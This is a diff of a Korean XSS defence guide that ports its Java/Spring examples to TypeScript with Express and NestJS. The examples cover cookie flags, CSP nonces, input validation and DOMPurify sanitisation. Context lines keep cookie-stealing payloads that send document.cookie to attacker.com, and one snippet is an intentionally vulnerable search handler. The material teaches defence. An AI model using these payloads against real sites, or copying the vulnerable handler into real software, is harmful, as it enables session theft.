@@ -83,13 +83,12 @@ GET /search?q=<script>document.location='https://attacker.com/steal?c='+document
 
 서버 측 코드가 검색어를 이스케이프 없이 HTML에 삽입하면 스크립트가 실행된다:
 
-```java
-// 취약한 서블릿 코드
-@GetMapping("/search")
-public String search(@RequestParam String q, Model model) {
-    model.addAttribute("query", q);  // 이스케이프 없이 전달
-    return "search-result";
-}
+```typescript
+// 취약한 Express 코드
+app.get('/search', (req, res) => {
+  const q = req.query.q as string;
+  res.send(`<p>검색어: ${q}</p>`); // 이스케이프 없이 출력 — 위험
+});
 ```
 
 ```html
@@ -240,26 +239,24 @@ navigator.sendBeacon("https://attacker.com/log", document.cookie);
 
 `HttpOnly` 플래그가 설정된 쿠키는 JavaScript에서 접근할 수 없다. `document.cookie`로 읽히지 않는다.
 
-```java
-// Spring Boot — 세션 쿠키에 HttpOnly 설정
-// application.yml
-// server:
-//   servlet:
-//     session:
-//       cookie:
-//         http-only: true
-//         secure: true
-//         same-site: strict
+```typescript
+// Express/NestJS — 세션 쿠키에 HttpOnly 설정
+// .env (또는 ConfigService)
+// SESSION_COOKIE_SECURE=true
+// SESSION_COOKIE_SAME_SITE=Strict
 
 // 직접 쿠키를 설정하는 경우
-ResponseCookie cookie = ResponseCookie.from("sessionId", sessionId)
-    .httpOnly(true)
-    .secure(true)
-    .sameSite("Strict")
-    .path("/")
-    .maxAge(Duration.ofHours(1))
-    .build();
-response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
+import { Response } from 'express';
+
+function setSessionCookie(res: Response, sessionId: string): void {
+  res.cookie('sessionId', sessionId, {
+    httpOnly: true,           // JavaScript 접근 차단
+    secure: true,             // HTTPS 전송만 허용
+    sameSite: 'strict',       // CSRF 방지
+    path: '/',
+    maxAge: 60 * 60 * 1000,  // 1시간 (밀리초)
+  });
+}
 ```
 
 HttpOnly만으로 XSS 방어가 끝나는 게 아니다. XSS가 성공하면 쿠키를 못 읽더라도 피해자의 세션에서 API를 직접 호출할 수 있다. 비밀번호 변경, 송금 요청 같은 작업을 스크립트로 수행한다. HttpOnly는 피해를 줄이는 장치지, XSS 자체를 막는 건 아니다.
@@ -492,17 +489,26 @@ CSP가 XSS를 막는 핵심 원리:
 2. **외부 스크립트 출처 제한** — 공격자 서버에서 스크립트를 로드할 수 없다
 3. **eval() 차단** — `script-src`에 `'unsafe-eval'`이 없으면 eval 계열 함수가 차단된다
 
-```java
-// Spring Security에서 CSP 설정
-@Bean
-public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
-    http.headers(headers -> headers
-        .contentSecurityPolicy(csp -> csp
-            .policyDirectives("default-src 'self'; script-src 'self'; object-src 'none'")
-        )
-    );
-    return http.build();
+```typescript
+// NestJS main.ts — Helmet로 CSP 설정
+import helmet from 'helmet';
+
+async function bootstrap() {
+  const app = await NestFactory.create(AppModule);
+
+  app.use(
+    helmet.contentSecurityPolicy({
+      directives: {
+        defaultSrc: ["'self'"],
+        scriptSrc:  ["'self'"],
+        objectSrc:  ["'none'"],
+      },
+    }),
+  );
+
+  await app.listen(3000);
 }
+bootstrap();
 ```
 
 ### nonce 기반 CSP
@@ -525,23 +531,27 @@ Content-Security-Policy: script-src 'nonce-abc123def456'
 </script>
 ```
 
-```java
-// Spring에서 nonce 생성 및 적용
-@Component
-public class CspNonceFilter extends OncePerRequestFilter {
-    @Override
-    protected void doFilterInternal(HttpServletRequest request,
-                                     HttpServletResponse response,
-                                     FilterChain chain) throws ServletException, IOException {
-        String nonce = Base64.getEncoder().encodeToString(
-            SecureRandom.getInstanceStrong().generateSeed(16)
-        );
-        request.setAttribute("cspNonce", nonce);
-        response.setHeader("Content-Security-Policy",
-            "script-src 'nonce-" + nonce + "' 'strict-dynamic'");
-        chain.doFilter(request, response);
-    }
+```typescript
+// Express 미들웨어 — nonce 생성 및 적용
+import { randomBytes } from 'crypto';
+import { Request, Response, NextFunction } from 'express';
+
+function cspNonceMiddleware(req: Request, res: Response, next: NextFunction): void {
+  const nonce = randomBytes(16).toString('base64');
+
+  // 이후 템플릿에서 res.locals.cspNonce 로 접근 가능
+  res.locals.cspNonce = nonce;
+
+  res.setHeader(
+    'Content-Security-Policy',
+    `script-src 'nonce-${nonce}' 'strict-dynamic'`,
+  );
+
+  next();
 }
+
+// app.ts
+// app.use(cspNonceMiddleware);
 ```
 
 ### strict-dynamic
@@ -864,36 +874,51 @@ SRI는 자기 도메인의 정적 파일에는 별 의미가 없다. 같은 출�
 
 ### 입력 검증
 
-```java
-// Spring에서 입력값 검증
-@PostMapping("/api/comments")
-public ResponseEntity<?> createComment(@Valid @RequestBody CommentRequest request) {
-    // Bean Validation으로 길이, 형식 제한
-    commentService.create(request);
-    return ResponseEntity.ok().build();
+```typescript
+// NestJS — 입력값 검증 (class-validator)
+import { IsNotEmpty, IsString, MaxLength, Matches } from 'class-validator';
+import { Body, Controller, Post } from '@nestjs/common';
+
+export class CreateCommentDto {
+  @IsNotEmpty()
+  @IsString()
+  @MaxLength(5000)
+  @Matches(/^[^<>]*$/, { message: 'HTML 태그를 포함할 수 없습니다' })
+  content: string;
 }
 
-public class CommentRequest {
-    @NotBlank
-    @Size(max = 5000)
-    @Pattern(regexp = "^[^<>]*$", message = "HTML 태그를 포함할 수 없습니다")
-    private String content;
+@Controller('api/comments')
+export class CommentController {
+  constructor(private readonly commentService: CommentService) {}
+
+  @Post()
+  async createComment(@Body() dto: CreateCommentDto) {
+    // ValidationPipe가 DTO를 자동 검증 (main.ts에서 useGlobalPipes 등록)
+    await this.commentService.create(dto);
+    return { ok: true };
+  }
 }
 ```
 
 HTML을 허용해야 하는 경우(위지윅 에디터) 서버에서 sanitize한다:
 
-```java
-// Java에서 OWASP Java HTML Sanitizer 사용
-import org.owasp.html.PolicyFactory;
-import org.owasp.html.Sanitizers;
+```typescript
+// Node.js — DOMPurify (서버 사이드: jsdom + dompurify)
+// npm install dompurify jsdom @types/dompurify @types/jsdom
+import { JSDOM } from 'jsdom';
+import DOMPurify from 'dompurify';
 
-PolicyFactory policy = Sanitizers.FORMATTING
-    .and(Sanitizers.LINKS)
-    .and(Sanitizers.BLOCKS);
+const { window } = new JSDOM('');
+const purify = DOMPurify(window as unknown as Window);
 
-String safeHtml = policy.sanitize(userInput);
-// <script>, <iframe>, 이벤트 핸들러 등이 제거됨
+// 허용 태그를 화이트리스트로 제한 (OWASP FORMATTING+LINKS+BLOCKS 상당)
+const ALLOWED_TAGS = ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br', 'blockquote', 'h1', 'h2', 'h3'];
+const ALLOWED_ATTR = ['href', 'title', 'target'];
+
+function sanitizeHtml(userInput: string): string {
+  return purify.sanitize(userInput, { ALLOWED_TAGS, ALLOWED_ATTR });
+  // <script>, <iframe>, 이벤트 핸들러 등이 제거됨
+}
 ```
 
 ### 출력 이스케이프
@@ -919,17 +944,26 @@ String safeHtml = policy.sanitize(userInput);
 
 API가 JSON을 반환하더라도 Content-Type이 잘못 설정되면 브라우저가 HTML로 해석한다.
 
-```java
+```typescript
 // Content-Type이 없거나 text/html이면 위험하다
 // 반드시 application/json으로 설정한다
-@GetMapping(value = "/api/data", produces = MediaType.APPLICATION_JSON_VALUE)
-public ResponseEntity<Map<String, String>> getData() {
-    // Spring의 @RestController는 기본적으로 application/json을 사용한다
-    // 직접 ResponseEntity를 만들 때 Content-Type을 명시하는 습관을 갖는다
-    return ResponseEntity.ok()
-        .contentType(MediaType.APPLICATION_JSON)
-        .body(data);
-}
+
+// Express
+import { Router, Request, Response } from 'express';
+const router = Router();
+
+router.get('/api/data', (req: Request, res: Response) => {
+  // res.json()은 자동으로 Content-Type: application/json 을 설정한다
+  res.json(data);
+
+  // 직접 send를 쓸 경우 Content-Type을 명시하는 습관을 갖는다
+  // res.setHeader('Content-Type', 'application/json');
+  // res.send(JSON.stringify(data));
+});
+
+// NestJS — @Controller + @Get은 객체 반환 시 기본으로 application/json 사용
+// @Get('/api/data')
+// getData(): Record<string, string> { return data; }
 ```
 
 ### 파일 업로드를 통한 XSS
